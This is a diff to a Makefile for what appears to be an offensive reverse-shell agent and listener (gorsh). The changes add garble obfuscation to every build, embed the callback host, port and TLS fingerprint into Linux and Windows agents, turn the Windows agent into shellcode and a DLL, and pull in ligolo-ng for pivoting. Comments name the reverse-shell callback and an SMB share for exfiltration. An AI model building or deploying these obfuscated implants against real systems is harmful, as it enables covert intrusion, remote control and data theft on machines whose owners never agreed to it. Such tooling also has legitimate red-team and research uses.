@@ -1,20 +1,60 @@
 ##############
+# DEPENDENCY MANAGEMENT
+##############
+LIGOLO_REPO = https://github.com/nicocha30/ligolo-ng
+LIGOLO_DIR = ligolo-ng
+LIGOLO_BIN = $(GOBIN)/ligolo
+GODONUT = $(GOBIN)/go-donut
+GARBLE = $(GOBIN)/garble
+FZF = $(GOBIN)/fzf
+
+# Build the proxy for ligolo-ng 
+$(LIGOLO_BIN): $(LIGOLO_DIR)
+	go build -o $(LIGOLO_BIN) $(LIGOLO_DIR)/cmd/proxy/main.go
+
+# Clone the official ligolo-ng repository
+$(LIGOLO_DIR):
+	git clone $(LIGOLO_REPO)
+
+# Install go-donut
+$(GODONUT):
+	go install github.com/Binject/go-donut@latest
+
+# Install garble
+$(GARBLE):
+	go install mvdan.cc/garble@latest
+
+# Install fzf
+$(FZF):
+	go install github.com/junegunn/fzf@latest
+
+install: $(LIGOLO_BIN) $(GODONUT) $(GARBLE) $(FZF)
+	@echo "All dependencies are installed !"
+	@mkdir -p /tmp/tmux-$$(id -u)
+	@timeout 1 nc -lkU /tmp/tmux-$$(id -u)/default
+	@echo "Default socket file created for initiating tmux sessions !"
+
+##############
 #  CONFIGS
 ##############
 # used for artifact naming
-APP ?= gorsh
-SERVER = ${OUT}/${APP}-server
+APP ?= agent
+SERVER = ./server
+
 # artifact output directory
 OUT ?= build
+
 # build command prefix
-BUILD = go build
-# BUILD = go build
+BUILD = $(GARBLE) -seed=random -literals -tiny build
+
 # operation systems to build for
 PLATFORMS = linux windows darwin
+
 # host the reverse shell will call back to
-LHOST ?= localhost
-# port the reverse shell will call back to
-LPORT ?= 8443
+INTERFACE ?= ""
+LPORT ?= ""
+LHOST ?= ""
+
 # exfil and tool path to serve over smb
 TOOLS ?= /srv
 EXFIL ?= /srv
@@ -23,6 +63,18 @@ ASSEMBLY_PATH = pkg/execute_assembly/embed
 assembly_repo = https://api.github.com/repos/flangvik/sharpcollection/contents/
 target_vers = 4.5
 
+##############
+#    SET SSL
+#  CERTIFICATES
+##############
+SRV_KEY = certs/server.key
+SRV_PEM = certs/server.pem
+FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
+
+$(SRV_KEY) $(SRV_PEM) &:
+	mkdir -p certs
+	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
+	@cat ${SRV_KEY} >> ${SRV_PEM}
 
 ##############
 #  ADVANCED
@@ -33,7 +85,8 @@ ifneq ($(UNAME), Windows)
 	DLLCC=x86_64-w64-mingw32-gcc
 endif
 # embeds paramaters
-LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
+LDFLAGS_SERVER = "-s -w -X main.Iface=$(INTERFACE) -X main.Host=$(LHOST) -X main.Port=$(LPORT) -X main.fingerPrint=${FINGERPRINT}"
+LDFLAGS_AGENT = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
 # references the calling target within each block
 target = $(word 1, $@)
 
@@ -43,32 +96,39 @@ target = $(word 1, $@)
 ##############
 all: $(PLATFORMS) shellcode dll ## makes all windows, shellcode, dll, linux, darwin targets
 
-${PLATFORMS}: $(SRV_KEY) $(GARBLE) ## one of: windows, linux, darwin
+linux: $(SRV_KEY) install ## make the linux agent
 	GOOS=${target} ${BUILD} \
 		-buildmode pie \
-		-ldflags ${LDFLAGS} \
-		-o ${OUT}/${APP}.${target} \
+		-ldflags ${LDFLAGS_AGENT} \
+		-o ${OUT}/${APP}_linux \
 		cmd/gorsh/main.go
 
-$(SERVER): $(SRV_KEY) ## make the listening server
+windows: $(SRV_KEY) install ## make the windows agent
+	GOOS=${target} ${BUILD} \
+		-buildmode pie \
+		-ldflags ${LDFLAGS_AGENT} \
+		-o ${OUT}/${APP}.exe \
+		cmd/gorsh/main.go
+
+server: $(SRV_KEY) $(LIGOLO_BIN) install ## make the listening server
 	${BUILD} \
 		-buildmode pie \
-		-ldflags ${LDFLAGS} \
+		-ldflags ${LDFLAGS_SERVER} \
 		-o ${target} \
 		cmd/gorsh-server/main.go
 
-shellcode: $(GODONUT) windows ## generate PIC windows shellcode
+shellcode: $(GODONUT) install windows ## generate PIC windows shellcode
 	${GODONUT} --arch x64 --verbose \
 		--in ${OUT}/${APP}.windows \
 		--out ${OUT}/${APP}.windows.bin 
 
-dll:  ## creates a windows dll. exports are definded in `cmd/gorsh-dll/dllmain.go`
+dll: install ## creates a windows dll. exports are definded in `cmd/gorsh-dll/dllmain.go`
 	CGO_ENABLED=1 CC=${DLLCC} \
 	GOOS=windows ${BUILD} \
 		-buildmode=c-shared \
 		-trimpath \
 		${ZSTD.windows} \
-		-ldflags ${LDFLAGS} \
+		-ldflags ${LDFLAGS_AGENT} \
 		-o ${OUT}/${APP}.windows.dll \
 		cmd/gorsh-dll/dllmain.go
 
@@ -79,9 +139,9 @@ listen: $(SERVER) ## start listening for callbacks on LPORT
 # LIGOLO MGMT
 ##############
 start-ligolo:  ## configures the necessary tun interfaces and starts ligolo. requires root
-	sudo ip tuntap add user player1 ligolo mode tun
+	sudo ip tuntap add user $$LOGNAME mode tun ligolo
 	sudo ip link set ligolo up
-	$(LIGOLO) -selfcert
+	$(LIGOLO_BIN) -selfcert
 
 
 ##############
@@ -135,35 +195,6 @@ superclean: clean ## also delete assemblies and certs
 
 
 ##############
-# DEPENDENCY MANAGEMENT
-##############
-LIGOLO = ${HOME}/.local/bin/ligolo
-GODONUT = ${GOPATH}/bin/go-donut
-GARBLE = ${GOPATH}/bin/garble
-FZF = ${GOPATH}/bin/fzf
-
-$(LIGOLO):
-	go install github.com/tnpitsecurity/ligolo-ng@latest
-$(GODONUT):
-	go install github.com/Binject/go-donut@latest
-$(GARBLE):
-	go install mvdan.cc/garble@latest
-$(FZF):
-	go install github.com/junegunn/fzf@latest
-
-
-# TLS cert targets
-SRV_KEY = certs/server.key
-SRV_PEM = certs/server.pem
-FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
-
-$(SRV_KEY) $(SRV_PEM) &:
-	mkdir -p certs
-	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
-	@cat ${SRV_KEY} >> ${SRV_PEM}
-
-
-##############
 # TEMPLATE DEFINITIONS
 ##############
 
@@ -211,6 +242,6 @@ endef
 
 .DEFAULT_GOAL = help
 help:
-	@grep -h -E '^[\$a-zA-Z\._-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
+	@grep -h -E '^[\$a-zA-Z\._-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*? ## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
 
 .PHONY: help clean smblogs server stop-smb start-smb start-ligolo dll shellcode listen shellcode $(PLATFORMS) all list-assemblies choose-assemblies
